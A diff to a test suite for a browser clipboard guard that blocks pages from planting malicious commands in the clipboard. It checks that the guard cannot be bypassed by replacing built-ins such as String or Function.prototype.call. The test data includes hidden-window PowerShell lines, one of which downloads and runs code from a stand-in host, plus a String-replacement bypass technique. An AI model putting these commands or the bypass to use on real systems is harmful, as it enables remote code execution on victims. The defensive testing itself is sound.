@@ -25,7 +25,7 @@ const BOOTSTRAP = `
   globalThis.__probe = { writeText: [], write: [], setData: [], execCommand: [] };
   // The sandbox realm's own intrinsics, so a test can tamper with the same
   // Array.prototype the guard and the stubs actually use.
-  globalThis.__realm = { Array };
+  globalThis.__realm = { Array, Object, Function, String, Reflect, Promise };
 
   globalThis.Blob = function Blob(text) { this.__text = String(text); };
   Blob.prototype.text = function () { return Promise.resolve(this.__text); };
@@ -104,7 +104,10 @@ async function loadGuard() {
     ctx: context,
     listeners,
     // Pretend a trusted click just happened, so policy sees a user gesture.
-    click: () => listeners.click?.({ isTrusted: true, target: null })
+    click: () => listeners.click?.({ isTrusted: true, target: null }),
+    // Run code inside the sandbox realm, so replacing a global binding such as
+    // String actually takes effect for name lookups there.
+    run: (code) => vm.runInContext(code, context)
   };
 }
 
@@ -302,8 +305,33 @@ const check = (name, condition, detail = "") => {
   check("wrappers are locked non-configurable and non-writable",
     /configurable: false, enumerable: false, writable: false/.test(guardSrc));
   check("clipboard is patched on the prototype, not the instance",
-    /Object\.getPrototypeOf\(navigator\.clipboard\)/.test(guardSrc) &&
+    /nativeGetPrototypeOf\(navigator\.clipboard\)/.test(guardSrc) &&
     !/Object\.defineProperty\(clipboard,/.test(guardSrc));
+
+  // --- captured intrinsics -------------------------------------------------
+  // The guard's own tooling must not be page-replaceable. Nothing after the
+  // capture block may look an intrinsic up by name at call time.
+  const afterCapture = guardSrc.split("const toPrimitiveString")[1] || "";
+  const stripComments = (t) => t.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
+  const live = stripComments(afterCapture);
+  for (const [label, re] of [
+    ["Function.prototype.call", /native[A-Za-z]*\.call\(/],
+    ["Object.defineProperty", /Object\.defineProperty\(/],
+    ["Object.getOwnPropertyDescriptor", /Object\.getOwnPropertyDescriptor\(/],
+    ["Object.getPrototypeOf", /Object\.getPrototypeOf\(/],
+    ["Promise.resolve", /Promise\.resolve\(/],
+    ["String", /[^a-zA-Z.]String\(/]
+  ]) {
+    check(`no call-time lookup of ${label} after the capture block`, !re.test(live),
+      (live.match(re) || [""])[0]);
+  }
+  check("forwarding uses a captured Reflect.apply", /nativeApply\(native, this/.test(guardSrc));
+  check("coercion is type-checked, not assumed to return a string",
+    /typeof out === "string" \? out : null/.test(guardSrc));
+  check("sealSequence verifies its own descriptor", /d\.writable \|\| d\.configurable/.test(guardSrc));
+  check("an unsealable sequence fails closed", /list === null \|\| !nativeIsArray\(list\)/.test(guardSrc));
+  check("Symbol.iterator is documented as uncapturable-by-design",
+    /cannot be replaced/.test(guardSrc));
   check("execCommand is patched on Document.prototype",
     /Document\.prototype/.test(guardSrc) &&
     !/Object\.defineProperty\(document, "execCommand"/.test(guardSrc));
@@ -437,6 +465,93 @@ const check = (name, condition, detail = "") => {
     check("a replaced Array.prototype iterator cannot redirect the native's view",
       probe.write.length === before + 1 && forwarded?.length === 1 && forwarded[0] === benign,
       "native iterated an item the classifier never inspected");
+  }
+
+  // --- behavioural: the guard's own tooling must be untamperable ----------
+  // Each of these replaces an intrinsic the guard uses, AFTER it has loaded and
+  // captured its references. A guard that looked them up at call time would be
+  // routed through page code by any one of them.
+  {
+    const R = ctx.__realm;
+
+    // Function.prototype.call: would hijack every native.call(this, v) forward.
+    {
+      const realCall = R.Function.prototype.call;
+      let hijacked = 0;
+      R.Function.prototype.call = function (...args) {
+        hijacked += 1;
+        return realCall.apply(this, args);
+      };
+      let received;
+      try {
+        click();
+        await clipboard.writeText("plain text via tampered call");
+        received = probe.writeText[probe.writeText.length - 1];
+      } finally {
+        R.Function.prototype.call = realCall;
+      }
+      check("a replaced Function.prototype.call cannot intercept forwarding",
+        received === "plain text via tampered call" && hijacked === 0,
+        `hijacked ${hijacked} call(s), native got ${JSON.stringify(received)}`);
+    }
+
+    // String: a replacement returning an OBJECT would be stringified to something
+    // benign by the classifier and re-coerced to the payload by the binding.
+    {
+      loaded.run(`
+        globalThis.__realString = String;
+        globalThis.__n = 0;
+        globalThis.String = function (v) {
+          if (v && v.__bait) {
+            return { toString: () => (__n++ ? "powershell -w hidden -nop -c calc" : "hello") };
+          }
+          return __realString(v);
+        };
+      `);
+      let received;
+      try {
+        click();
+        await clipboard.writeText({ __bait: true, toString: () => "real value" });
+        received = probe.writeText[probe.writeText.length - 1];
+      } finally {
+        loaded.run("globalThis.String = __realString;");
+      }
+      check("a replaced String cannot smuggle an object past the classifier",
+        typeof received === "string" && !/powershell/i.test(received),
+        `native got ${typeof received}: ${String(received).slice(0, 40)}`);
+    }
+
+    // Object.defineProperty replaced with a silent no-op. Because the guard
+    // captured it before page script ran, the replacement is simply inert: the
+    // seal still succeeds, so a payload is still caught and a benign item is
+    // still forwarded. (The fail-closed branch for a seal that cannot be
+    // VERIFIED is asserted from the source above; it is unreachable here because
+    // the snapshot is a fresh array the guard owns.)
+    {
+      const realDefine = R.Object.defineProperty;
+      R.Object.defineProperty = function () { /* silently does nothing */ };
+      let blockedPayload = false;
+      let forwardedBenign = false;
+      try {
+        const payloadBefore = probe.write.length;
+        click();
+        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
+          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+        })));
+        blockedPayload = probe.write.length === payloadBefore;
+
+        const benignBefore = probe.write.length;
+        click();
+        await clipboard.write(R.Array.of(new ctx.ClipboardItem({ "text/plain": "hi" })));
+        forwardedBenign = probe.write.length === benignBefore + 1;
+      } finally {
+        R.Object.defineProperty = realDefine;
+      }
+      check("a replaced Object.defineProperty is inert: payload still blocked",
+        blockedPayload);
+      check("a replaced Object.defineProperty is inert: benign still forwarded",
+        forwardedBenign);
+    }
   }
 
   // A legitimate non-text item must still go through.
